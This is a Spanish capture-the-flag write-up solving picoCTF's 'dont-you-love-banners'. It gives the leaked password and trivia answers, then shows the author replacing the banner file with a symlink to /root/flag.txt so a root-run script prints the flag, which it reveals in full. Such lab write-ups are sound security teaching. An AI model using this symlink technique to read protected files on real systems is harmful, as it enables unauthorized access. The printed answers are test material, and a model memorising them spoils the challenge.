## Reto: dont-you-love-banners
### Descripción
¿Puedes abusar de la pancarta?El servidor ha estado filtrando información crucial sobre `tethys.picoctf.net 50881`. Utilice la información filtrada para llegar al servidor.Para conectarse al uso de la aplicación en ejecución `nc tethys.picoctf.net 62823`. De la información anterior, abuse de la máquina y encuentre la bandera en el directorio /root.
### Solución
Iniciamos con la conexión al servidor proporcionado después de tener iniciada la instancia del reto:
```shell
nc tethys.picoctf.net 62823
```
Como podemos ver, este servidor nos mostró la contraseña que vamos a usar para podernos conectar, por lo que ahora probamos con el otro servidor:
```r
*************************************
**************WELCOME****************
*************************************

what is the password?
```

En este caso el servidor nos condujo a la aplicación como tal, donde se nos pide la contraseña (la cual habíamos obtenido anteriormente), donde una vez ingresada debemos responder una serie de preguntas para acceder a la consola que nos permita manipular los directorios:
```
what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
player@challenge:~$
```

Sí hemos respondido correctamente a la preguntas anteriores se nos desplegará ahora el prompt indicando que ya podremos ejecutar comandos, siendo el primero **ls -al**, para poder ver los archivos y permisos que hay en el directorio actual.

```shell
ls -al
```

Se hacen pruebas para determinar el contenido de dos archivos, siendo estos "banner" y "text", lo anterior con el comando **cat**:
```shell
cat banner
```

Ahora procedemos a revisar el contenido en el directorio raíz, donde podemos ver dos archivos que podemos consultar: "flag.txt" y "script.py":
```shell
ls -al /root
```

Dado que por los permisos que contiene **flag.txt**, no nos es posible revisarlo, procedemos a hacer un cat al script de python:
```python
cat /root/script.py
```

Obteniendo el siguiente código:
```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```


Como en el código nos dice algo de reemplazar el banner en cierto directorio, procedemos a aplicar un comando **rm** en dicho directorio, seguido de la creación de un enlace simbólico, puesto que cuando el usuario deseé acceder al banner, en realidad lo estará haciendo a **flag.txt**:
```shell
rm /home/player/banner
ln -s /root/flag.txt /home/player/banner
```

Por lo que terminamos la conexión con el servidor para iniciar otra y ver si nuestro cambio surtió efecto:
```q
┌──(hackerjos㉿Joshue)-[~]
└─$ nc tethys.picoctf.net 62823
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

what is the password?
```

Como podemos ver, resultó favorable, puesto que nos arrojó la bandera que da solución al reto:
```flag
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}
```



### Notas adicionales
### Referencias


 
